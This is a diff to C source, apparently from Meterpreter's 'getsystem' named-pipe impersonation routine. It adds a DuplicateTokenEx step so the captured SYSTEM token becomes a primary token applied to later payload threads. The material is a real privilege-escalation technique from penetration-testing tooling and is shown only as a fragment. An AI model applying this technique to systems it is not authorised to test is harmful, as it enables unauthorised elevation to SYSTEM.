@@ -11,6 +11,7 @@ DWORD THREADCALL elevate_namedpipe_thread( THREAD * thread )
 	DWORD dwResult              = ERROR_ACCESS_DENIED;
 	HANDLE hServerPipe          = NULL;
 	HANDLE hToken               = NULL;
+	HANDLE hTokenDup            = NULL;
 	char * cpServicePipe        = NULL;
 	Remote * remote             = NULL;
 	BYTE bMessage[128]          = {0};
@@ -60,9 +61,13 @@ DWORD THREADCALL elevate_namedpipe_thread( THREAD * thread )
 			if( !OpenThreadToken( GetCurrentThread(), TOKEN_ALL_ACCESS, FALSE, &hToken ) )
 				CONTINUE_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. OpenThreadToken failed" );
 
+			// duplicate it into a primary token
+			if( ! DuplicateTokenEx( hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hTokenDup ) )
+				CONTINUE_ON_ERROR( "[ELEVATE] elevate_namedpipe_thread. DuplicateTokenEx failed" );
+
 			// now we can set the meterpreters thread token to that of our system 
 			// token so all subsequent meterpreter threads will use this token.
-			core_update_thread_token( remote, hToken );
+			core_update_thread_token( remote, hTokenDup );
 
 			dwResult = ERROR_SUCCESS;
 
